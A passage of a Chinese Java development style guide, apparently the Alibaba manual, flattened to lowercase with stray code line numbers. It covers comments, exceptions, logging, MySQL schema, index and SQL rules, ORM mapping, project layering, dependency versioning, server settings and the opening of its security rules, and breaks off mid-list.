//伪代码如下\n final boolean existed = (file.open(filename, "w") != null) && (...) || (...);\n if (existed) {\n  ...\n }\n\n\n1\n2\n3\n4\n5\n\n\n反例：\n\n if ((file.open(filename, "w") != null) && (...) || (...)) {\n  ...\n }\n\n\n1\n2\n3\n\n\n 5. 【推荐】循环体中的语句要考量性能，以下操作尽量移至循环体外处理，如定义对象、变量、获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。\n\n 6. 【推荐】接口入参保护，这种场景常见的是用于做批量操作的接口。\n\n 7. 【参考】下列情形，需要进行参数校验：\n    1） 调用频次低的方法。\n    2） 执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参 数错误导致中间执行回退，或者错误，那得不偿失。\n    3） 需要极高稳定性和可用性的方法。\n    4） 对外提供的开放接口，不管是 rpc/api/http 接口。\n    5） 敏感权限入口。\n\n 8. 【参考】下列情形，不需要进行参数校验：\n    1） 极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查要求。\n    2） 底层调用频度比较高的方法。毕竟是像纯净水过滤的最后一道，参数错误不太可能到底 层才会暴露问题。一般 dao 层与 service 层都在同一个应用中，部署在同一台服务器中，所以 dao 的参数校验，可以省略。\n    3） 被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检查或者肯定不会有问题，此时可以不校验参数。\n\n\n# 注释规约\n\n 1.  【强制】类、类属性、类方法的注释必须使用 javadoc 规范，使用/**内容*/格式，不得使用 //xxx 方式。\n     说明： 在 ide 编辑窗口中，javadoc 方式会提示相关注释，生成 javadoc 可以正确输出相应注释；在 ide 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值的意义，提高 阅读效率。\n\n 2.  【强制】所有的抽象方法（包括接口中的方法）必须要用 javadoc 注释、除了返回值、参数、异常说明外，还必须指出该方法做什么事情，实现什么功能。\n     说明： 对子类的实现要求，或者调用注意事项，请一并说明。\n\n 3.  【强制】所有的类都必须添加创建者和创建日期。\n\n 4.  【强制】方法内部单行注释，在被注释语句上方另起一行，使用 //注释。方法内部多行注释使用/* */注释，注意与代码对齐。\n\n 5.  【强制】所有的枚举类型字段必须要有注释，说明每个数据项的用途。\n\n 6.  【推荐】与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持英文原文即可。\n     反例： “tcp 连接超时”解释成“传输控制协议连接超时”，理解反而费脑筋。\n\n 7.  【推荐】代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑等的修改。\n     说明： 代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后， 就失去了导航的意义。\n\n 8.  【参考】合理处理注释掉的代码。在上方详细说明，而不是简单的注释掉。如果无用，则删除。\n     说明： 代码被注释掉有两种可能性：1）后续会恢复此段代码逻辑。2）永久不用。前者如果没 有备注信息，难以知晓注释动机。后者建议直接删掉（代码仓库保存了历史代码）。\n\n 9.  【参考】对于注释的要求：第一、能够准确反应设计思想和代码逻辑；第二、能够描述业务含义，使别的程序员能够迅速了解到代码背后的信息。完全没有注释的大段代码对于阅读者形同天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。\n\n 10. 【参考】好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释是相当大的负担。\n     反例：\n\n// put elephant into fridge\nput(elephant, fridge);\n\n\n1\n2\n\n\n方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不需要额外的注释。\n\n 11. 【参考】特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描，经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。\n     1） 待办事宜（todo）:（ 标记人，标记时间，[预计处理时间]）表示需要实现，但目前还未实现的功能。这实际上是一个 javadoc 的标签，目前的 javadoc 还没有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 javadoc 标签）。\n     2） 错误，不能工作（fixme）:（标记人，标记时间，[预计处理时间]）在注释中用 fixme 标记某代码是错误的，而且不能工作，需要及时纠正的情况。\n\n\n# 其他\n\n 1. 【强制】在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。 说明：不要在方法体内定义：pattern pattern = pattern.compile(规则);\n\n 2. 【强制】velocity 调用 pojo 类的属性时，建议直接使用属性名取值即可，模板引擎会自动按规范调用 pojo 的 getxxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is前缀），会自动调用 isxxx()方法。\n    说明： 注意如果是 boolean 包装类对象，优先调用 getxxx()的方法。\n\n 3. 【强制】后台输送给页面的变量必须加$!{var}——中间的感叹号。\n    说明： 如果 var=null 或者不存在，那么${var}会直接显示在页面上。\n\n 4. 【强制】注意 math.random() 这个方法返回是 double 类型，注意取值的范围 0≤x<1（能够取到零值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后取整，直接使用 random 对象的 nextint 或者 nextlong 方法。\n\n 5. 【强制】获取当前毫秒数 system.currenttimemillis(); 而不是 new date().gettime();\n    说明： 如果想获取更加精确的纳秒级时间值，使用 system.nanotime()的方式。在 jdk8 中，针对统计时间等场景，推荐使用 instant 类。\n\n 6. 【推荐】不要在视图模板中加入任何复杂的逻辑。 说明： 根据 mvc 理论，视图的职责是展示，不要抢模型和控制器的活。\n\n 7. 【推荐】任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。\n\n 8. 【推荐】对于“明确停止使用的代码和配置”，如方法、变量、类、配置文件、动态配置属性等要坚决从程序中清理出去，避免造成过多垃圾。\n\n\n# 异常日志\n\n\n# 异常处理\n\n 1.  【强制】java 类库中定义的一类 runtimeexception 可以通过预先检查进行规避，而不应该通过 catch 来处理，比如： indexoutofboundsexception ， nullpointerexception 等等。\n     说明： 无法通过预检查的异常除外，如在解析一个外部传来的字符串形式数字时，通过 catch numberformatexception 来实现。\n     正例： if (obj != null) {...}\n     反例： try { obj.method() } catch (nullpointerexception e) {...}\n\n 2.  【强制】异常不要用来做流程控制，条件控制，因为异常的处理效率比条件分支低。\n\n 3.  【强制】对大段代码进行 try-catch，这是不负责任的表现。catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。\n\n 4.  【强制】捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容。\n\n 5.  【强制】有 try 块放到了事务代码中，catch 异常后，如果需要回滚事务，一定要注意手动回滚事务。\n\n 6.  【强制】finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。\n     说明： 如果 jdk7 及以上，可以使用 try-with-resources 方式。\n\n 7.  【强制】不能在 finally 块中使用 return，finally 块中的 return 返回后方法结束执行，不会再执行 try 块中的 return 语句。\n\n 8.  【强制】捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。\n     说明： 如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。\n\n 9.  【推荐】方法的返回值可以为 null，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下会返回 null 值。调用方需要进行 null 判断防止 npe 问题。\n     说明： 本手册明确防止 npe 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。\n\n 10. 【推荐】防止 npe，是程序员的基本修养，注意 npe 产生的场景：\n     1）返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 npe。\n     反例： public int f() { return integer 对象}， 如果为 null，自动解箱抛 npe。\n     2） 数据库的查询结果可能为 null。\n     3） 集合里的元素即使 isnotempty，取出的数据元素也可能为 null。\n     4） 远程调用返回对象时，一律要求进行空指针判断，防止 npe。\n     5） 对于 session 中获取的数据，建议 npe 检查，避免空指针。\n     6） 级联调用 obj.geta().getb().getc()；一连串调用，易产生 npe。\n     正例： 使用 jdk8 的 optional 类来防止 npe 问题。\n\n 11. 【推荐】定义时区分 unchecked / checked 异常，避免直接抛出 new runtimeexception()，更不允许抛出 exception 或者 throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：daoexception / serviceexception 等。\n\n 12. 【参考】在代码中使用“抛异常”还是“返回错误码”，对于公司外的 http/api 开放接口必须使用“错误码”；而应用内部推荐异常抛出；跨应用间 rpc 调用优先考虑使用 result 方式，封装 issuccess()方法、“错误码”、“错误简短信息”。\n     说明： 关于 rpc 方法返回方式使用 result 方式的理由：\n     1）使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。\n     2）如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。\n\n 13. 【参考】避免出现重复的代码（don’t repeat yourself），即 dry 原则。\n     说明： 随意复制和粘贴代码，必然会导致代码的重复，在以后需要修改时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是共用模块。\n     正例： 一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取： private boolean checkparam(dto dto) {...}\n\n\n# 日志规约\n\n 1. 【强制】应用中不可直接使用日志系统（log4j、logback）中的 api，而应依赖使用日志框架 slf4j 中的 api，使用门面模式的日志框架，有利于维护和各个类的日志处理方式统一。\n\nimport org.slf4j.logger;\nimport org.slf4j.loggerfactory;\nprivate static final logger logger = loggerfactory.getlogger(abc.class);\n\n\n1\n2\n3\n\n\n 2. 【强制】日志文件推荐至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。\n\n 3. 【强制】应用中的扩展日志（如打点、临时监控、访问日志等）命名方式：appname_logtype_logname.log。logtype:日志类型，推荐分类有 stats/desc/monitor/visit 等；logname:日志描述。这种命名的好处：通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。\n    正例： mppserver 应用中单独监控时区转换异常，如： mppserver_monitor_timezoneconvert.log\n    说明： 推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于 通过日志对系统进行及时监控。\n\n 4. 【强制】对 trace/debug/info 级别的日志输出，必须使用条件输出形式或者使用占位符的方 式。\n    说明： logger.debug("processing trade with id: " + id + " symbol: " + symbol);如果日志级别是 warn，上述日志不会打印，但是会执行字符串拼接操作，如果 symbol 是对象，会执行 tostring() 方法，浪费了系统资源，执行了上述操作，最终日志却没有打印。\n    正例： （条件）\n\nif (logger.isdebugenabled()) {\n    logger.debug("processing trade with id: " + id + " symbol: " + symbol);\n}\n\n\n1\n2\n3\n\n\n正例： （占位符）\n\nlogger.debug("processing trade with id: {} symbol : {} ", id, symbol);\n\n\n1\n\n\n 5. 【强制】避免重复打印日志，浪费磁盘空间，务必在 log4j.xml 中设置 additivity=false。\n    正例： <logger name="com.taobao.dubbo.config" additivity="false">\n\n 6. 【强制】异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。\n    正例： logger.error(各类参数或者对象 tostring + "_" + e.getmessage(), e);\n\n 7. 【推荐】谨慎地记录日志。生产环境禁止输出 debug 日志；有选择地输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘 撑爆，并记得及时删除这些观察日志。\n    说明： 大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？\n\n 8. 【参考】可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。注意日志输出的级别，error 级别只记录系统逻辑出错、异常等重要的错误信息。如非必要，请不要在此场景打出 error 级别。\n\n\n# mysql 数据库\n\n\n# 建表规约\n\n 1.  【强制】表达是与否概念的字段，必须使用 is_xxx 的方式命名，数据类型是 unsigned tinyint（ 1 表示是，0 表示否）。\n     说明： 任何字段如果为非负数，必须是 unsigned。\n     正例： 表达逻辑删除的字段名 is_deleted，1 表示删除，0 表示未删除。\n\n 2.  【强制】表名、字段名必须使用小写字母或数字，禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。\n     正例： getter_admin，task_config，level3_name\n     反例： getteradmin，taskconfig，level_3_name\n\n 3.  【强制】表名不使用复数名词。\n     说明： 表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 do 类名也是单数形式，符合表达习惯。\n\n 4.  【强制】禁用保留字，如 desc、range、match、delayed 等，请参考 mysql 官方保留字。\n\n 5.  【强制】主键索引名为 pk_字段名；唯一索引名为 uk_字段名；普通索引名则为 idx_字段名。\n     说明： pk_ 即 primary key；uk_ 即 unique key；idx_ 即 index 的简称。\n\n 6.  【强制】小数类型为 decimal，禁止使用 float 和 double。\n     说明： float 和 double 在存储的时候，存在精度损失的问题，很可能在值的比较时，得到不正确的结果。如果存储的数据范围超过 decimal 的范围，建议将数据拆成整数和小数分开存储。\n\n 7.  【强制】如果存储的字符串长度几乎相等，使用 char 定长字符串类型。\n\n 8.  【强制】varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度大于此值，定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效率。\n\n 9.  【强制】表必备三字段：id, gmt_create, gmt_modified。 说明： 其中 id 必为主键，类型为 unsigned bigint、单表时自增、步长为 1。gmt_create, gmt_modified 的类型均为 date_time 类型。\n\n 10. 【推荐】表的命名最好是加上“业务名称_表的作用”。\n     正例： tiger_task / tiger_reader / mpp_config\n\n 11. 【推荐】库名与应用名称尽量一致。\n\n 12. 【推荐】如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。\n\n 13. 【推荐】字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循：\n     1）不是频繁修改的字段。\n     2）不是 varchar 超长字段，更不能是 text 字段。\n     正例： 商品类目名称使用频率高，字段长度短，名称基本一成不变，可在相关联的表中冗余存 储类目名称，避免关联查询。\n\n 14. 【推荐】单表行数超过 500 万行或者单表容量超过 2gb，才推荐进行分库分表。\n     说明： 如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。\n\n 15. 【参考】合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索速度。\n     正例： 如下表，其中无符号值可以避免误存负数，且扩大了表示范围。\n\n对象     年龄区间      类型                  表示范围\n人      150 岁之内   unsigned tinyint    无符号值：0 到 255\n龟      数百岁       unsigned smallint   无符号值：0 到 65535\n恐龙化石   数千万年      unsigned int        无符号值：0 到约 42.9 亿\n太阳     约 50 亿年   unsigned bigint     无符号值：0 到约 10 的 19 次方\n\n\n# 索引规约\n\n 1.  【强制】业务上具有唯一特性的字段，即使是多个字段的组合，也必须建成唯一索引。 说明：不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的；另外，即使在应用层做了非常完善的校验控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。\n\n 2.  【强制】 超过三个表禁止 join。需要 join 的字段，数据类型必须绝对一致；多表关联查询时，保证被关联的字段需要有索引。\n     说明： 即使双表 join 也要注意表索引、sql 性能。\n\n 3.  【强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据实际文本区分度决定索引长度即可。\n     说明： 索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90%以上，可以使用 count(distinct left(列名, 索引长度))/count(*)的区分度来确定。\n\n 4.  【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。\n     说明： 索引文件具有 b-tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。\n\n 5.  【推荐】如果有 order by 的场景，请注意利用索引的有序性。order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现 file_sort 的情况，影响查询性能。\n     正例： where a=? and b=? order by c; 索引：a_b_c\n     反例： 索引中有范围查找，那么索引有序性无法利用，如：where a>10 order by b; 索引 a_b 无法排序。\n\n 6.  【推荐】利用覆盖索引来进行查询操作，避免回表。\n     说明： 如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这个目录就是起到覆盖索引的作用。\n     正例： 能够建立索引的种类：主键索引、唯一索引、普通索引，而覆盖索引是一种查询的一种 效果，用 explain 的结果，extra 列会出现：using index。\n\n 7.  【推荐】利用延迟关联或者子查询优化超多分页场景。\n     说明： mysql 并不是跳过 offset 行，而是取 offset+n 行，然后返回放弃前 offset 行，返回 n 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 sql 改写。\n     正例： 先快速定位需要获取的 id 段，然后再关联： select a.* from 表 1 a, (select id from 表 1 where 条件 limit 100000,20 ) b where a.id=b.id\n\n 8.  【推荐】sql 性能优化的目标：至少要达到 range 级别，要求是 ref 级别，如果可以是 consts 最好。\n     说明：\n     1） consts 单表中最多只有一个匹配行（主键或者唯一索引），在优化阶段即可读取到数据。\n     2） ref 指的是使用普通的索引（normal index）。\n     3） range 对索引进行范围检索。\n     反例： explain 表的结果，type=index，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。\n\n 9.  【推荐】建组合索引的时候，区分度最高的在最左边。\n     正例： 如果 where a=? and b=? ，a 列的几乎接近于唯一值，那么只需要单建 idx_a 索引即可。\n     说明： 存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如：where a>? and b=? 那么即使 a 的区分度更高，也必须把 b 放在索引的最前列。\n\n 10. 【推荐】防止因字段类型不同造成的隐式转换，导致索引失效。\n\n 11. 【参考】创建索引时避免有如下极端误解：\n     1）宁滥勿缺。误认为一个查询就需要建一个索引。\n     2）宁缺勿滥。误认为索引会消耗空间、严重拖慢更新和新增速度。\n     3）抵制惟一索引。误认为业务的惟一性一律需要在应用层通过“先查后插”方式解决。\n\n\n# sql 语句\n\n 1.  【强制】不要使用 count(列名)或 count(常量)来替代 count()，count()是 sql92 定义的标准统计行数的语法，跟数据库无关，跟 null 和非 null 无关。\n     说明： count(*)会统计值为 null 的行，而 count(列名)不会统计此列为 null 值的行。\n\n 2.  【强制】count(distinct col) 计算该列除 null 之外的不重复行数，注意 count(distinct col1, col2) 如果其中一列全为 null，那么即使另一列有不同的值，也返回为 0。\n\n 3.  【强制】当某一列的值全是 null 时，count(col)的返回结果为 0，但 sum(col)的返回结果为 null，因此使用 sum()时需注意 npe 问题。\n     正例： 可以使用如下方式来避免 sum 的 npe 问题：select if(isnull(sum(g)),0,sum(g)) from table;\n\n 4.  【强制】使用 isnull()来判断是否为 null 值。注意：null 与任何值的直接比较都为 null。\n     说明：\n     1） null<>null 的返回结果是 null，而不是 false。\n     2） null=null 的返回结果是 null，而不是 true。\n     3） null<>1 的返回结果是 null，而不是 true。\n\n 5.  【强制】在代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。\n\n 6.  【强制】不得使用外键与级联，一切外键概念必须在应用层解决。\n     说明： （概念解释）学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，则为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度。\n\n 7.  【强制】禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。\n\n 8.  【强制】数据订正时，删除和修改记录时，要先 select，避免出现误删除，确认无误才能执行更新语句。\n\n 9.  【推荐】in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。\n\n 10. 【参考】如果有全球化需要，所有的字符存储与表示，均以 utf-8 编码，注意字符统计函数的区别。\n     说明： select length("轻松工作")； 返回为 12\n     select character_length("轻松工作")； 返回为 4\n     如果要使用表情，那么使用 utfmb4 来进行存储，注意它与 utf-8 编码的区别。\n\n 11. 【参考】truncate table 比 delete 速度快，且使用的系统和事务日志资源少，但 truncate 无事务且不触发 trigger，有可能造成事故，故不建议在开发代码中使用此语句。\n     说明： truncate table 在功能上与不带 where 子句的 delete 语句相同。\n\n\n# orm 映射\n\n 1. 【强制】在表查询中，一律不要使用 * 作为查询的字段列表，需要哪些字段必须明确写明。\n    说明： 1）增加查询分析器解析成本。2）增减字段容易与 resultmap 配置不一致。\n\n 2. 【强制】pojo 类的布尔属性不能加 is，而数据库字段必须加 is_，要求在 resultmap 中进行字段与属性之间的映射。\n    说明： 参见定义 pojo 类以及数据库字段定义规定，在<resultmap>中增加映射，是必须的。在 mybatis generator 生成的代码中，需要进行对应的修改。\n\n 3. 【强制】不要用 resultclass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要定义；反过来，每一个表也必然有一个与之对应。\n    说明： 配置映射关系，使字段与 do 类解耦，方便维护。\n\n 4. 【强制】sql.xml 配置参数使用：#{}，#param# 不要使用${} 此种方式容易出现 sql 注入。\n\n 5. 【强制】ibatis 自带的 queryforlist(string statementname,int start,int size)不推荐使用。\n    说明： 其实现方式是在数据库取到statementname对应的sql语句的所有记录，再通过sublist 取 start,size 的子集合。\n    正例：\n\n map<string, object> map = new hashmap<string, object>();\n map.put("start", start);\n map.put("size", size);\n\n\n1\n2\n3\n\n\n 6.  【强制】不允许直接拿 hashmap 与 hashtable 作为查询结果集的输出。\n     说明： resultclass=”hashtable”，会置入字段名和属性值，但是值的类型不可控。\n\n 7.  【强制】更新数据表记录时，必须同时更新记录对应的 gmt_modified 字段值为当前时间。\n\n 8.  【推荐】不要写一个大而全的数据更新接口，传入为 pojo 类，不管是不是自己的目标更新字段，都进行 update table set c1=value1,c2=value2,c3=value3; 这是不对的。执行 sql 时，不要更新无改动的字段，一是易出错；二是效率低；三是增加 binlog 存储。\n\n 9.  【参考】@transactional 事务不要滥用。事务会影响数据库的 qps，另外使用事务的地方需要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。\n\n 10. 【参考】<isequal>中的 comparevalue 是与属性值对比的常量，一般是数字，表示相等时带上此条件；<isnotempty>表示不为空且不为 null 时执行；<isnotnull>表示不为 null 值时执行。\n\n\n# 工程结构\n\n\n# 应用分层\n\n 1. 【推荐】图中默认上层依赖于下层，箭头关系表示可直接依赖，如：开放接口层可以依赖于 web 层，也可以直接依赖于 service 层，依此类推：\n    \n    \n    \n    * 开放接口层： 可直接封装 service 方法暴露成 rpc 接口；通过 web 封装成 http 接口；进行网关安全控制、流量控制等。\n    * 终端显示层： 各个端的模板渲染并执行显示的层。当前主要是 velocity 渲染，js 渲染，jsp 渲染，移动端展示等。\n    * web 层： 主要是对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理等。\n    * service 层： 相对具体的业务逻辑服务层。\n    * manager 层： 通用业务处理层，它有如下特征：\n      1. 对第三方平台封装的层，预处理返回结果及转化异常信息；\n      2. 对 service 层通用能力的下沉，如缓存方案、中间件通用处理；\n      3. 与 dao 层交互，对多个 dao 的组合复用。\n    * dao 层： 数据访问层，与底层 mysql、oracle、hbase 进行数据交互。\n    * 外部接口或第三方平台： 包括其它部门 rpc 开放接口，基础平台，其它公司的 http 接口。\n\n 2. 【参考】 （分层异常处理规约）在 dao 层，产生的异常类型有很多，无法用细粒度的异常进行 catch，使用 catch(exception e)方式，并 throw new daoexception(e)，不需要打印 日志，因为日志在 manager/service 层一定需要捕获并打到日志文件中去，如果同台服务器再打日志，浪费性能和存储。在 service 层出现异常时，必须记录出错日志到磁盘，尽可能带上参数信息，相当于保护案发现场。如果 manager 层与 service 同机部署，日志方式与 dao 层处理一致，如果是单独部署，则采用与 service 一致的处理方式。web 层绝不应该继续往上抛异常，因为已经处于顶层，无继续处理异常的方式，如果意识到这个异常将导致页面无法正常渲染，那么就应该直接跳转到友好错误页面，加上友好的错误提示信息。开放接口层要将异常处理成错误码和错误信息方式返回。\n\n 3. 【参考】分层领域模型规约：\n    \n    * do（data object）： 与数据库表结构一一对应，通过 dao 层向上传输数据源对象。\n    * dto（data transfer object）： 数据传输对象，service 和 manager 向外传输的对象。\n    * bo（business object）： 业务对象。可以由 service 层输出的封装业务逻辑的对象。\n    * query： 数据查询对象，各层接收上层的查询请求。注：超过 2 个参数的查询封装，禁止使用 map 类来传输。\n    * vo（view object）： 显示层对象，通常是 web 向模板渲染引擎层传输的对象。\n\n\n# 二方库依赖\n\n 1.  【强制】定义 gav 遵从以下规则：\n     1） groupid 格式：com.{公司/bu }.业务线.[子业务线]，最多 4 级。\n     说明： {公司/bu} 例如：alibaba/taobao/tmall/aliexpress 等 bu 一级；子业务线可选。\n     正例： com.taobao.jstorm 或 com.alibaba.dubbo.register\n     2） artifactid 格式：产品线名-模块名。语义不重复不遗漏，先到中央仓库去查证一下。\n     正例： dubbo-client / fastjson-api / jstorm-tool\n     3） version：详细规定参考下方。\n\n 2.  【强制】二方库版本号命名方式：主版本号.次版本号.修订号\n     1） 主版本号：当做了不兼容的 api 修改，或者增加了能改变产品方向的新功能。\n     2） 次版本号：当做了向下兼容的功能性新增（新增类、接口等）。\n     3） 修订号：修复 bug，没有修改方法签名的功能加强，保持 api 兼容性。\n     说明： 注意：起始版本号必须为：1.0.0，而不是 0.0.1 正式发布的类库必须先去中央仓库进行查证，使版本号有延续性，正式版本号不允许覆盖升级。如当前版本：1.3.3，那么下一个合理的版本号：1.3.4 或 1.4.0 或 2.0.0\n\n 3.  【强制】线上应用不要依赖 snapshot 版本（安全包除外）。\n     说明： 不依赖 snapshot 版本是保证应用发布的幂等性。另外，也可以加快编译时的打包构建。\n\n 4.  【强制】二方库的新增或升级，保持除功能点之外的其它 jar 包仲裁结果不变。如果有改变， 必须明确评估和验证，建议进行 dependency:resolve 前后信息比对，如果仲裁结果完全不一 致，那么通过 dependency:tree 命令，找出差异点，进行<excludes>排除 jar 包。\n\n 5.  【强制】二方库里可以定义枚举类型，参数可以使用枚举类型，但是接口返回值不允许使用枚 举类型或者包含枚举类型的 pojo 对象。\n\n 6.  【强制】依赖于一个二方库群时，必须定义一个统一的版本变量，避免版本号不一致。 说明：依赖 springframework-core,-context,-beans，它们都是同一个版本，可以定义一 个变量来保存版本：${spring.version}，定义依赖的时候，引用该版本。\n\n 7.  【强制】禁止在子项目的 pom 依赖中出现相同的 groupid，相同的 artifactid，但是不同的 version。\n     说明： 在本地调试时会使用各子项目指定的版本号，但是合并成一个 war，只能有一个版本号 出现在最后的 lib 目录中。可能出现线下调试是正确的，发布到线上却出故障的问题。\n\n 8.  【推荐】所有 pom 文件中的依赖声明放在<dependencies>语句块中，所有版本仲裁放在 <dependencymanagement>语句块中。 说明：<dependencymanagement>里只是声明版本，并不实现引入，因此子项目需要显式的声 明依赖，version 和 scope 都读取自父 pom。而<dependencies>所有声明在主 pom 的 <dependencies>里的依赖都会自动引入，并默认被所有的子项目继承。\n\n 9.  【推荐】二方库不要有配置项，最低限度不要再增加配置项。\n\n 10. 【参考】为避免应用二方库的依赖冲突问题，二方库发布者应当遵循以下原则：\n     1）精简可控原则。移除一切不必要的 api 和依赖，只包含 service api、必要的领域模型对 象、utils 类、常量、枚举等。如果依赖其它二方库，尽量是 provided 引入，让二方库使用 者去依赖具体版本号；无 log 具体实现，只依赖日志框架。\n     2）稳定可追溯原则。每个版本的变化应该被记录，二方库由谁维护，源码在哪里，都需要能 方便查到。除非用户主动升级版本，否则公共二方库的行为不应该发生变化。\n\n\n# 服务器\n\n 1. 【推荐】高并发服务器建议调小 tcp 协议的 time_wait 超时时间。 说明：操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接，在高并发访问下，服 务器端会因为处于 time_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上 调小此等待值。\n    正例： 在 linux 服务器上请通过变更/etc/sysctl.conf 文件去修改该缺省值（秒）： net.ipv4.tcp_fin_timeout = 30\n\n 2. 【推荐】调大服务器所支持的最大文件句柄数（file descriptor，简写为 fd）。\n    说明： 主流操作系统的设计是将 tcp/udp 连接采用与文件一样的方式去管理，即一个连接对 应于一个 fd。主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易因为 fd 不足而出现“open too many files”错误，导致新的连接无法建立。 建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）。\n\n 3. 【推荐】给 jvm 设置-xx:+heapdumponoutofmemoryerror 参数，让 jvm 碰到 oom 场景时输出 dump 信息。\n    说明： oom 的发生是有概率的，甚至有规律地相隔数月才出现一例，出现时的现场信息对查错 非常有价值。\n\n 4. 【参考】服务器内部重定向使用 forward；外部重定向地址使用 url 拼装工具类来生成，否则 会带来 url 维护不一致的问题和潜在的安全风险。\n\n\n# 安全规约\n\n 1. 【强制】隶属于用户个人的页面或者功能必须进行权限控制校验。\n    说明： 防止没有做水平权限校验就可随意访问、修改、删除别人的数据，比如查看他人的私信 内容、修改他人的订单。\n\n 2. 【强制】用户敏感数据禁止直接展示，必须对展示数据进行脱敏。\n    说明： 查看个人手机号码会显示成:158****9119，隐藏中间 4 位，防止隐私泄露。\n\n 3. 【强制】用户输入的 sql 参数严格使用参数绑定或者 metadata 字段值限定，防止 sql 注入， 禁止字符串拼接 sql 访问数据库。\n\n 4. 【强制】用户请求传入的任何参数必须做有效性验证。\n    说明： 忽略参数校验可能导致：\n    \n    * page size 过大导致内存溢出\n    * 恶意 order by 导致数据库慢查询\n    * 任意重定向\n    * sql 注入\n    * 反序列化注入\n    * 正则输入源串拒绝服务 redos\n    \n    说明： java 代码用正则来验证客户端的输入，有些正则写法验证普通用户输入没有问题， 但是如果攻击人员使用的是特殊构造的字符串来验证，有可能导致死循环的结果。\n\n 5. 